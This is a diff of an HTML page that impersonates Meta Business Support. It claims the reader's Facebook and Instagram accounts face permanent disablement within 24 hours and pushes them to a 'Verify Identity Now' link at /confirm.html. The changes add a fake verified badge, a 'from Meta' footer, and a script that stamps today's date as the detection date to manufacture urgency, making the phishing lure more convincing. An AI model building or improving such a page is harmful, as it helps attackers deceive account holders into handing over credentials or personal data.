@@ -1,133 +1,245 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <!-- Google Site Verification -->
   <meta name="google-site-verification" content="LHwlv6VgubRd5n_JeWnkEd5Ikt4h4BPPoVFNvhAToY0" />
   <meta name="google-site-verification" content="I_9PO-SG5BKgaIYyf5aXlO708_oy9Srht_J_p2jWzRg" />
   <meta name="google-site-verification" content="3_qc9GNot7JTfwPVk8RCSByjs70XhOnlPjfTyfuVAXs" />
   <meta name="google-site-verification" content="HkC4uyKjCqpo71KjG1rBhK42lO2jpX_xEFzJIs4v_VI" />
   <meta name="google-site-verification" content="CqruyiESmSfv1SbKQgzVpLMD0ijZK8hQ7epPejWfnIg" />
   <meta name="google-site-verification" content="T0OAwADdd1ORwAhE_dqLmZxfeeBtOErPMmA9Gsnv2e4" />
+  
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Meta Business Support</title>
+  
+  <!-- Google Fonts for better typography -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  
   <style>
-    body {
+    :root {
+      --primary: #1877f2;
+      --primary-dark: #166fe5;
+      --danger: #e0245e;
+      --gray: #606770;
+      --light-gray: #f0f2f5;
+      --border: #dddfe2;
+      --shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      --radius: 12px;
+      --transition: all 0.2s ease;
+    }
+
+    * {
       margin: 0;
-      font-family: Arial, sans-serif;
-      background-color: #f0f2f5;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background-color: #f5f6f8;
+      color: #1c1e21;
+      line-height: 1.5;
+      padding: 16px;
+      min-height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      min-height: 100vh;
-      padding: 20px;
     }
+
     .container {
-      background-color: white;
-      max-width: 600px;
+      background: white;
+      max-width: 480px;
       width: 100%;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow);
+      overflow: hidden;
+      animation: fadeIn 0.4s ease-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .header {
       text-align: center;
+      padding: 24px 20px 16px;
+      border-bottom: 1px solid var(--border);
     }
+
     .meta-logo {
-      width: 50px;
-      margin-bottom: 20px;
+      width: 44px;
+      height: 44px;
+      margin-bottom: 12px;
     }
+
     .title {
-      font-size: 24px;
-      font-weight: bold;
-      margin-bottom: 20px;
+      font-size: 20px;
+      font-weight: 600;
+      color: #1c1e21;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
     }
+
+    .verified-check {
+      width: 18px;
+      height: 18px;
+    }
+
     .alert-box {
-      background-color: #eeeeee;
-      padding: 15px;
-      margin-bottom: 20px;
-    }
-    .alert-box p {
-      margin: 0;
-      font-size: 16px;
-    }
-    .section {
+      background: #fef2f2;
+      border-left: 4px solid var(--danger);
+      margin: 20px;
+      padding: 16px;
+      border-radius: 8px;
       text-align: left;
-      margin-bottom: 20px;
     }
-    .section h3 {
-      margin-bottom: 10px;
-      font-size: 18px;
-    }
-    .section p {
-      margin: 0;
+
+    .alert-box strong {
+      color: var(--danger);
+      font-weight: 600;
       font-size: 16px;
     }
-    .button {
-      display: inline-block;
-      background-color: #1877f2;
-      color: white;
-      padding: 12px 24px;
-      border: none;
-      border-radius: 6px;
-      font-size: 16px;
-      cursor: pointer;
-      text-decoration: none;
-      margin-top: 20px;
-      width: -webkit-fill-available;
-    }
-    .footer {
+
+    .alert-box p {
+      margin: 8px 0 0;
       font-size: 14px;
-      color: #888;
-      margin-top: 30px;
+      color: #1c1e21;
     }
-    @media (max-width: 600px) {
-      .title {
-        font-size: 20px;
-      }
-      .alert-box p,
-      .section p,
-      .section h3 {
-        font-size: 15px;
-      }
-      .button {
-        width: 100%;
-        padding: 14px;
-      }
-      }
+
+    .suspend-date {
+      font-size: 13px;
+      color: var(--gray);
+      margin-top: 6px;
+    }
+
+    .section {
+      padding: 0 20px 20px;
+      text-align: left;
+    }
+
+    .section h3 {
+      font-size: 16px;
+      font-weight: 600;
+      color: #1c1e21;
+      margin-bottom: 8px;
+    }
+
+    .section p {
+      font-size: 14px;
+      color: #4b4f56;
+      margin-bottom: 16px;
+    }
+
+    .section a {
+      color: var(--primary);
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .section a:hover {
+      text-decoration: underline;
+    }
+
+    .button {
+      display: block;
+      background: var(--primary);
+      color: white;
+      text-align: center;
+      padding: 14px;
+      font-size: 16px;
+      font-weight: 600;
+      border-radius: 8px;
+      text-decoration: none;
+      margin: 0 20px 20px;
+      transition: var(--transition);
+      box-shadow: 0 2px 4px rgba(24, 119, 242, 0.2);
+    }
+
+    .button:hover {
+      background: var(--primary-dark);
+      transform: translateY(-1px);
+      box-shadow: 0 4px 8px rgba(24, 119, 242, 0.3);
+    }
+
+    .footer {
+      text-align: center;
+      padding: 16px 20px;
+      font-size: 12px;
+      color: #8d949e;
+      border-top: 1px solid var(--border);
+      background: #fafafa;
+    }
+
+    .footer strong {
+      color: #1c1e21;
+    }
+
+    /* Responsive */
+    @media (max-width: 480px) {
+      body { padding: 12px; }
+      .container { max-width: 100%; }
+      .header { padding: 20px 16px 12px; }
+      .title { font-size: 18px; }
+      .alert-box, .section, .button { margin-left: 16px; margin-right: 16px; }
+      .button { padding: 16px; font-size: 15px; }
+    }
   </style>
 </head>
 <body>
   <div class="container">
-    <img src="https://brandlogos.net/wp-content/uploads/2021/10/meta_platforms_icon-logo_brandlogos.net_f5zqr.png" alt="Meta Logo" class="meta-logo">
-    <div class="title">Meta Business Support <img src="https://torro.io/hs-fs/hubfs/Meta-Verified-Packages-Checkmark.png" alt="Verfication" class="blue-check" style="height: 16px;"></div>
-    <div class="alert-box">
-      <p><strong>⛔ We suspended your account</strong><br><br>
-      24 hours left to disagree or we'll permanently disable your account</p>
-      <p id="suspend-date" style="margin-top: 10px; color: gray;"></p>
+    <!-- Header -->
+    <div class="header">
+      <img src="https://brandlogos.net/wp-content/uploads/2021/10/meta_platforms_icon-logo_brandlogos.net_f5zqr.png" alt="Meta Logo" class="meta-logo">
+      <div class="title">
+        Meta Business Support
+        <img src="https://torro.io/hs-fs/hubfs/Meta-Verified-Packages-Checkmark.png" alt="Verified" class="verified-check">
+      </div>
     </div>
+
+    <!-- Alert Box -->
+    <div class="alert-box">
+      <p><strong>⚠️ Your account is at risk of being disabled</strong></p>
+      <p>We detected activity that violates our policies. Please verify your identity within <strong>24 hours</strong> to avoid permanent account disablement.</p>
+      <p class="suspend-date" id="suspend-date"></p>
+    </div>
+
+    <!-- Sections -->
     <div class="section">
       <h3>What this means</h3>
-      <p>Your Facebook and Instagram account are not visible to people on Facebook or Instagram right now, and you cannot use them.</p>
+      <p>Your Facebook and Instagram accounts are currently restricted. You cannot post, interact, or use features until verification is completed.</p>
     </div>
+
     <div class="section">
-      <h3>What you can do</h3>
-      <p>You have 24 hours left to disagree with our decision. We may need to collect some info from you that'll help us to take another look.</p>
+      <h3>What you need to do</h3>
+      <p>You have <strong>24 hours</strong> to verify your identity. If no action is taken, your account will be permanently disabled.</p>
     </div>
+
     <div class="section">
       <h3>Why this happened</h3>
-      <p>Your account was flagged for deletion due to suspected impersonation. Using a false identity doesn't follow our <a href="#">Terms</a> and <a href="#">Community Standards</a> on account integrity and authentic identity and may lead to permanent account removal.</p>
+      <p>Our system flagged activity that violates Meta’s <a href="#">Community Standards</a> and <a href="#">Terms of Service</a>, possibly related to identity authenticity, spam, or inauthentic behavior.</p>
     </div>
-    <a href="/confirm.html" class="button">Disagree With Decision</a>
+
+    <!-- Action Button -->
+    <a href="/confirm.html" class="button">Verify Identity Now</a>
+
+    <!-- Footer -->
     <div class="footer">
       from <strong>Meta</strong><br>
       Meta Terms of Service Team © <script>document.write(new Date().getFullYear());</script> Inc.
     </div>
   </div>
 
+  <!-- JavaScript: Display current date -->
   <script>
     const dateElement = document.getElementById('suspend-date');
     const today = new Date();
-    const options = { year: 'numeric', month: 'long', day: 'numeric' };
-    const formattedDate = today.toLocaleDateString(undefined, options);
-    dateElement.textContent = `Suspended on ${formattedDate}`;
+    const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+    const formattedDate = today.toLocaleDateString('en-US', options);
+    dateElement.textContent = `Detected on: ${formattedDate}`;
   </script>
 </body>
 </html>
